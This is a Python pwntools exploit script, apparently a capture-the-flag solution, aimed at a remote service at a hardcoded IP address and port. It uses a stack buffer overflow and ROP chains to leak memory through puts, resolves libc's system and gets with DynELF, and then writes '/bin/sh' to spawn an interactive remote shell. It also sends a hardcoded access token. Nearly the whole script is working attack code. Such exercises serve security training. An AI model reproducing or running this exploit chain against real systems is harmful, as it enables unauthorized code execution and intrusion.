#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *
from time import sleep
from pwn import DynELF

# settings
local   = False
debug   = False

if local:
    target  = './back'
else:
    target  = ('115.28.78.54', 13455)

# get io
io  = mk(target, debug)

puts_plt    = 0x400570
pop_rdi_ret = 0x4007c3
entry       = 0x4005d0
main        = 0x4006bd

# exp
def leak_prepare(addr):
    io.ru('word?\n')
    payload  = ''.ljust(72, 'A')
    payload += l64(pop_rdi_ret)
    payload += l64(addr)
    payload += l64(puts_plt)
    payload += l64(entry)
    io.w(payload)

# for printf (puts)...
def leak(address, size):
    count       = 0
    buf         = ''
    while count < size:
        leak_prepare(address + count)
        data = io.ru('WelCome')[:-7] # get the whole data
        buf += (data[:-1] + '\x00') # newline
        count += (len(data[:-1]) + 1)
    leak_data = buf[:size]
    print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
    return leak_data

def leak_handle(address):
    io.ru('word?\n')
    payload  = ''.ljust(72, 'A')
    payload += l64(pop_rdi_ret)
    payload += l64(address)
    payload += l64(puts_plt)
    payload += l64(entry)
    io.w(payload)
    return (io.ru('WelCome')[:-8] + '\x00')

def leak_got():
    data = leak(0x601000, 0x60)
    for i in xrange(0, 0x60, 0x8):
        print '%08x' % l64(data[i:i+8])

def leak_exec():
    data = leak(entry, 0x280)
    fd = open('./bin', 'ab')
    fd.write(data)
    fd.close()

def leak_libc():
    libc_ptr = l64(leak(0x601000 + 0x28, 0x8))
    info_found('libc ptr', libc_ptr)
    d = DynELF(lambda addr: leak(addr, 0x8), libc_ptr, elf = None)
    #d = DynELF(leak_handle, libc_ptr, elf = None)
    return (d.lookup('system'), d.lookup('gets'))

def get_shell(system, gets):
    io.ru('password?\n')
    payload  = ''.ljust(72, 'A')
    payload += l64(pop_rdi_ret)
    payload += l64(0x601800)
    payload += l64(gets)
    payload += l64(pop_rdi_ret)
    payload += l64(0x601800)
    payload += l64(system)
    io.pr(payload)
    io.pr('/bin/sh\x00')
    info_shell()
    io.interact()

def exploit():
    #leak_got()
    libc_system, libc_gets = leak_libc()
    info_found('libc system', libc_system)
    info_found('libc gets', libc_gets)
    get_shell(libc_system, libc_gets)

def get_io():
    global io
    while True:
        try:
            io = mk(target, debug)
            io.ru('token')
            io.pr('35e51df1d01627ec602f1b2d9bc666f5LKJ6F4Ug')
            break
        except Exception as e:
            #print e
            continue

if __name__ == '__main__':
    get_io()
    exploit()
